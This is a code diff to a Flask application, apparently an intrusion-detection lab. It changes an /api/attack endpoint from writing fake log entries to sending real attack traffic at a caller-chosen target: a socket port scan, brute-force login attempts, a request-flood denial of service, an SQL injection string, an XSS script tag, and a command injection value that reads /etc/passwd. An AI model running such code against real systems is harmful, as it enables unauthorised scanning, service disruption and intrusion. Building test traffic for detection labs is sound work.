@@ -5,6 +5,8 @@ import random
 from datetime import datetime
 import os
 import logging
+import requests
+import socket
 
 app = Flask(__name__)
 
@@ -132,36 +134,57 @@ def dns_lookup():
 @app.route('/api/attack', methods=['POST'])
 def api_attack():
     attack_type = request.json.get('type')
-    target_ip = '127.0.0.1' 
-    attacker_ip = '192.168.1.50'
+    target_ip = request.json.get('target', '127.0.0.1')
+    base_url = f"http://{target_ip}:5000"
     
-    if attack_type == 'port_scan':
-        for port in [21, 22, 80, 443, 8080]:
-            append_log(attacker_ip, target_ip, port, 'SCAN_SYN', 'Creating Synthetic Log')
-            
-    elif attack_type == 'brute_force':
-        for _ in range(5):
-            append_log(attacker_ip, target_ip, 5000, 'LOGIN_ATTEMPT', 'Failed login admin:123')
-            
-    elif attack_type == 'dos':
-        try:
-            count = int(request.json.get('count', 50))
-        except:
-            count = 50
-            
-        for _ in range(count):
-            append_log(attacker_ip, target_ip, 5000, 'HTTP_REQUEST', 'GET / HTTP/1.1')
+    try:
+        if attack_type == 'port_scan':
+            # Real Port Scan
+            ports = [21, 22, 80, 443, 8080, 5000]
+            for port in ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    sock.connect_ex((target_ip, port))
+                    sock.close()
+                except:
+                    pass
+                
+        elif attack_type == 'brute_force':
+            # Real Brute Force
+            url = f"{base_url}/login"
+            for _ in range(5):
+                try:
+                    requests.post(url, json={'username': 'admin', 'password': 'wrongpassword'}, timeout=1)
+                except: pass
+                
+        elif attack_type == 'dos':
+            try:
+                count = int(request.json.get('count', 50))
+            except:
+                count = 50
+            # Real DoS
+            for _ in range(count):
+                try:
+                    requests.get(base_url, timeout=0.1)
+                except: pass
 
-    elif attack_type == 'sqli':
-        append_log(attacker_ip, target_ip, 5000, 'LOGIN_ATTEMPT', "User: admin' OR 1=1 --")
+        elif attack_type == 'sqli':
+            # Real SQLi
+            requests.post(f"{base_url}/login", json={'username': "admin' OR 1=1 --", 'password': 'x'}, timeout=1)
 
-    elif attack_type == 'xss':
-        append_log(attacker_ip, target_ip, 5000, 'SEARCH_QUERY', "Query: <script>alert('XSS')</script>")
+        elif attack_type == 'xss':
+            # Real XSS
+            requests.get(f"{base_url}/search", params={'q': "<script>alert('XSS')</script>"}, timeout=1)
 
-    elif attack_type == 'command_injection':
-        append_log(attacker_ip, target_ip, 5000, 'DNS_LOOKUP', "Target: 8.8.8.8; cat /etc/passwd")
+        elif attack_type == 'command_injection':
+            # Real RCE
+            requests.post(f"{base_url}/dns-lookup", json={'domain': "8.8.8.8; cat /etc/passwd"}, timeout=1)
             
-    return jsonify({'status': 'success', 'message': f'{attack_type} executed'})
+        return jsonify({'status': 'success', 'message': f'{attack_type} execution completed'})
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': f'Attack failed: {str(e)}'}), 500
 
 
 # --- IDS Logic ---
